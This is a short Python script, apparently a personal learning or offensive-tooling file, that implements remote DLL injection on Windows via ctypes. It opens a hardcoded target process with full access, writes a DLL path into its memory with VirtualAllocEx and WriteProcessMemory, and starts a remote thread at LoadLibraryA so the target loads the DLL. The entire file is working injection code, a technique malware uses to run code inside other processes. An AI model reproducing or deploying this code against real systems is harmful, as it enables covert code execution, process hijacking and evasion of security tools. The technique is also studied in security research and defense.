#!/usr/bin/env python3
'''
Date : 1402/01/14
Author : AmirhosseinKhanshabani - @AmirZoyber
 
Remote DLL Injection - Inject DLL into remote process


'''
from ctypes import *
from ctypes import wintypes

# Load kernel32.dll library and define some functions which are used in the script
kernel = windll.kernel32
LPCTSTR = c_char_p
SIZE_T = c_size_t

# OpenProcess function which is used to get a handle to a process
openProcess = kernel.OpenProcess
openProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
openProcess.restype = wintypes.HANDLE

# VirtualAllocEx function which is used to allocate memory in the remote process
virtualAllocEx = kernel.VirtualAllocEx
virtualAllocEx.argtypes =  [wintypes.HANDLE, wintypes.LPVOID, SIZE_T, wintypes.DWORD, wintypes.DWORD] 
virtualAllocEx.restype = wintypes.LPVOID

# WriteProcessMemory function which is used to write data into the remote process
WriteProcessMemory = kernel.WriteProcessMemory
WriteProcessMemory.argtypes = [wintypes.HANDLE, wintypes.LPVOID, wintypes.LPCVOID, SIZE_T, POINTER(SIZE_T)]
WriteProcessMemory.restype = wintypes.BOOL

# Get Module Handle function which is used to get a handle to a module and return the base address of the module
getModuleHandle = kernel.GetModuleHandleA
getModuleHandle.argtypes = [LPCTSTR]
getModuleHandle.restype = wintypes.HANDLE

# GetProcAddress function which is used to get the address of an exported function or variable from the specified module
getProcAddress = kernel.GetProcAddress
getProcAddress.argtypes = [wintypes.HANDLE, LPCTSTR]
getProcAddress.restype = wintypes.LPVOID

# class _SECURITY_ATTRIBUTES(Structure): is used to define the security attributes of the process which is used to create the process and the thread in the remote process.
class _SECURITY_ATTRIBUTES(Structure):
    _fields_ = [
        ('nLength', wintypes.DWORD),
        ('lpSecurityDescriptor', wintypes.LPVOID),
        ('bInheritHandle', wintypes.BOOL),]

SECURITY_ATTRIBUTES = _SECURITY_ATTRIBUTES # Define SECURITY_ATTRIBUTES as _SECURITY_ATTRIBUTES
LPSECURITY_ATTRIBUTES = POINTER(_SECURITY_ATTRIBUTES) # Define LPSECURITY_ATTRIBUTES as POINTER(_SECURITY_ATTRIBUTES) which is used to define the security attributes of the process which is used to create the process and the thread in the remote process.
LPTHREAD_START_ROUTINE = wintypes.LPVOID # Define LPTHREAD_START_ROUTINE as wintypes.LPVOID which is used to define the starting address of the thread

# CreateRemoteThread function which is used to create a thread that runs in the virtual address space of another process
createRemoteThread = kernel.CreateRemoteThread
createRemoteThread.argtypes = [wintypes.HANDLE, LPSECURITY_ATTRIBUTES, wintypes.DWORD, LPTHREAD_START_ROUTINE, wintypes.LPVOID, wintypes.DWORD, POINTER(wintypes.DWORD)]
createRemoteThread.restype = wintypes.HANDLE

MEM_COMMIT = 0x00001000 # Define MEM_COMMIT as 0x1000 which is used to allocate memory in the remote process
MEM_RESERVE = 0x00002000 # Define MEM_RESERVE as 0x2000 which is used to reserve memory in the remote process
PAGE_READWRITE = 0x04 # Define PAGE_READWRITE as 0x04 which is used to set the memory protection of the memory in the remote process
EXECUTE_IMMEDIATELY = 0x0 # Define EXECUTE_IMMEDIATELY as 0x00000000 which is used to set the thread execution state in the remote process
PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0x00000FFF) # Define PROCESS_ALL_ACCESS as 0x001F0FFF which is used to set the access rights of the process in the remote process

# Define the DLL which is used to inject into the remote process
DLL = b"C:\\Users\\Amirhossein\\Desktop\\DLL\\DLL.dll"
pid = 2160
handle = openProcess(PROCESS_ALL_ACCESS, False, pid) # Get a handle to the process

if not handle:
    raise WinError()

print("[+] Handle obtained successfully - > " + str(handle))

# remote memory
remoteMemory = virtualAllocEx(handle,False, len(DLL)+1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) # Allocate memory in the remote process

if not remoteMemory:
    raise WinError()
print("[+] Memory allocated successfully - > " + hex(remoteMemory) +" : "+ str(remoteMemory))

# Write the DLL into the remote process
write = WriteProcessMemory(handle, remoteMemory, DLL, len(DLL)+1, None) # Write the DLL into the remote process
if not write:
    raise WinError()
print("[+] DLL bytes written successfully - > " + str(write))


# Get the address of LoadLibraryA function
loadLib = getProcAddress(getModuleHandle(b"kernel32.dll"), b"LoadLibraryA") # Get the address of LoadLibraryA function

if not loadLib:
    raise WinError()
print("[+] LoadLibraryA address obtained successfully - > " + hex(loadLib) +" : "+ str(loadLib))

rthread = createRemoteThread(handle, None, 0, loadLib, remoteMemory, EXECUTE_IMMEDIATELY, None) # Create a thread in the remote process
